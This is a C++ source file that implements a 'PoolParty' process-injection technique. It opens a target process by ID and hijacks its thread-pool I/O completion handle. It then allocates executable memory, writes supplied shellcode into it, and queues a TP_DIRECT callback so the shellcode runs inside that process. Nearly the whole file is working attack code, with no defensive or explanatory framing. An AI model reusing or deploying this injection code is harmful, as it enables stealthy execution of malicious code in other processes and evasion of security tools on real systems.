#include "PoolParty.hpp"
#include "../Memory/Memory.hpp"

PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: m_dwTargetPid(dwTargetPid), m_cShellcode(cShellcode), m_szShellcodeSize(szShellcodeSize), m_RemoteObjectAddress(nullptr)
{
}

std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() const
{
	auto p_hTargetPid = w_OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, m_dwTargetPid);
	return p_hTargetPid;
}

std::shared_ptr<HANDLE> PoolParty::GetTargetThreadPoolWorkerFactoryHandle() const
{
	auto p_hWorkerFactory = HijackWorkerFactoryProcessHandle(m_p_hTargetPid);
	return p_hWorkerFactory;
}

std::shared_ptr<HANDLE> PoolParty::GetTargetThreadPoolIoCompletionHandle() const
{
	auto p_hIoCompletion = HijackIoCompletionProcessHandle(m_p_hTargetPid);
	return p_hIoCompletion;
}

std::shared_ptr<HANDLE> PoolParty::GetTargetThreadPoolTimerHandle() const
{
	auto p_hTimer = HijackIRTimerProcessHandle(m_p_hTargetPid);
	return p_hTimer;
}

WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) const
{
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation{ 0 };
	w_NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), nullptr);
	return WorkerFactoryInformation;
}

void PoolParty::HijackHandles()
{
}

LPVOID PoolParty::AllocateShellcodeMemory() const
{
	LPVOID ShellcodeAddress = (LPVOID)Alloc(m_szShellcodeSize, PAGE_EXECUTE_READWRITE);
	return ShellcodeAddress;
}

void PoolParty::WriteShellcode() const
{
	Write((uintptr_t)m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
}

void PoolParty::Inject()
{
	m_p_hTargetPid = this->GetTargetProcessHandle();
	this->HijackHandles();
	m_ShellcodeAddress = this->AllocateShellcodeMemory();
	this->WriteShellcode();
	this->SetupExecution();
}

void PoolParty::Cleanup() const
{
}

AsynchronousWorkItemInsertion::AsynchronousWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void AsynchronousWorkItemInsertion::HijackHandles()
{
	m_p_hIoCompletion = this->GetTargetThreadPoolIoCompletionHandle();
}

RemoteTpDirectInsertion::RemoteTpDirectInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteTpDirectInsertion::SetupExecution() const
{
	auto nonConstThis = const_cast<RemoteTpDirectInsertion*>(this);
	TP_DIRECT Direct{ 0 };
	Direct.Callback = m_ShellcodeAddress;
	const auto RemoteDirectAddress = static_cast<PTP_DIRECT>((LPVOID)Alloc(sizeof(TP_DIRECT), PAGE_READWRITE));
	nonConstThis->m_RemoteObjectAddress = RemoteDirectAddress;
	Write((uintptr_t)RemoteDirectAddress, &Direct, sizeof(TP_DIRECT));
	w_ZwSetIoCompletion(*m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
}